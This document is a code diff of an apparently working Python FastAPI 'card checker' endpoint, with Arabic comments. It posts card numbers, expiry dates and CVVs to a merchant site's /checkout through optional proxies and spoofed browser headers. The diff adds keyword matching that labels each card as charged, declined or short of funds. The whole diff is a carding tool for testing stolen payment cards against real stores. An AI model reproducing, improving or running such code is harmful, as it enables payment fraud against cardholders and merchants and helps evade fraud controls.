@@ -3,6 +3,7 @@ import httpx
 
 app = FastAPI()
 
+# Headers احترافية
 HEADERS = {
     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
     "Accept": "application/json, text/javascript, */*; q=0.01",
@@ -22,13 +23,14 @@ async def check_card(request: Request, cc: str = Query(...), site: str = Query(.
 
         cc_parts = cc.split('|')
         payload = {
-            "card[number]": cc_parts[0] if len(cc_parts) > 0 else cc,
-            "card[exp_month]": cc_parts[1] if len(cc_parts) > 1 else "",
-            "card[exp_year]": cc_parts[2] if len(cc_parts) > 2 else "",
-            "card[cvv]": cc_parts[3] if len(cc_parts) > 3 else "",
+            "card_number": cc_parts[0] if len(cc_parts) > 0 else cc,
+            "exp_month": cc_parts[1] if len(cc_parts) > 1 else "",
+            "exp_year": cc_parts[2] if len(cc_parts) > 2 else "",
+            "cvv": cc_parts[3] if len(cc_parts) > 3 else "",
             "amount": amount
         }
 
+        # معالج البروكسي الذكي
         formatted_proxy = None
         if proxy:
             clean_proxy = proxy.strip().replace("http://", "").replace("https://", "")
@@ -44,23 +46,30 @@ async def check_card(request: Request, cc: str = Query(...), site: str = Query(.
         transport = httpx.AsyncHTTPTransport(proxy=formatted_proxy) if formatted_proxy else None
 
         async with httpx.AsyncClient(transport=transport, headers=request_headers, timeout=30.0, follow_redirects=True) as client:
-            # تم تغيير المسار ليكون عاماً لـ Shopify
-            target_url = f"{site}/checkout" 
-            
+            target_url = f"{site}/checkout"
             response = await client.post(target_url, data=payload)
             
-            try:
-                data = response.json()
-                msg = data.get("message") or data.get("error") or f"Code: {response.status_code}"
-            except:
-                msg = f"Status: {response.status_code}"
+            # تحليل النتيجة للـ JSON المطلوب
+            res_text = response.text.lower()
+            if "declined" in res_text or "invalid" in res_text or response.status_code != 200:
+                resp_msg = "CARD_DECLINED"
+                status = "false"
+            elif "success" in res_text or "charged" in res_text:
+                resp_msg = "CHARGED"
+                status = "true"
+            elif "insufficient" in res_text:
+                resp_msg = "INSUFFICIENT_FUNDS"
+                status = "false"
+            else:
+                resp_msg = "DECLINED"
+                status = "false"
             
             return {
                 "Gateway": "Shopify Payments",
                 "Price": amount,
                 "Proxy": "Live" if proxy else "None",
-                "Response": msg,
-                "Status": "true" if response.status_code == 200 else "false",
+                "Response": resp_msg,
+                "Status": status,
                 "CC": cc
             }
 
